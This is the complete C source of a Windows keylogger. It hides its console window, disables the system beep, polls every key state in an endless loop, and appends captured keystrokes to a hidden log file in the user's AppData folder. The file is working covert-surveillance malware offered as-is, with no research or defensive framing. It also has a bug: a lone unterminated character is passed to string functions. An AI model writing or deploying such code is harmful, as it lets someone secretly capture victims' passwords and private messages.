#include <stdio.h>
#include <windows.h>
#include <string.h>

#define BUFFER_SIZE 30
char key_buffer[BUFFER_SIZE] = {0};
int buffer_index = 0;

void write_to_file(const char* log) {
    char path[MAX_PATH];

    snprintf(path, sizeof(path), "%s\\log.txt", getenv("APPDATA"));

    FILE *fptr = fopen(path, "a");

    if (fptr != NULL) {
        fprintf(fptr, "%s", log);
        fclose(fptr);
    }
    SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN); 
}

void logkeys(const char* log) {
    int len = strlen(log);
    if (buffer_index + len >= BUFFER_SIZE) {
        write_to_file(key_buffer);
        buffer_index = 0;
        key_buffer[0] = '\0';
    }
    strcpy(key_buffer + buffer_index, log);
    buffer_index += len;
}

int handlespecialkeys(int key) {
    switch (key) {
        case VK_SPACE:     logkeys(" ");         return 1;
        case VK_RETURN:    logkeys("\n");        return 1;
        case VK_SHIFT:     logkeys("[Shift]");   return 1;
        case VK_BACK:      logkeys("[Backspace]"); return 1;
        case VK_TAB:       logkeys("[Tab]");     return 1;
        case VK_CONTROL:   logkeys("[Ctrl]");    return 1;
        case VK_MENU:      logkeys("[Alt]");     return 1;
        default: return 0;
    }
}

void process_key(int key, short pressed_keys[]) {
    if (!pressed_keys[key]) {  // Check if key was previously unpressed
        pressed_keys[key] = 1;

        if (!handlespecialkeys(key)) {  
                char character = (char)key;
                logkeys(&character);
        }
    }
}


int main() {
    SystemParametersInfo(SPI_SETBEEP, 0, 0, SPIF_SENDCHANGE);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    short pressed_keys[256] = {0};
    
    while (1) {
        Sleep(20);
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                process_key(key, pressed_keys);
            } else {
                pressed_keys[key] = 0;  // Reset when key is released
            }
        }
    }

    return 0;
}
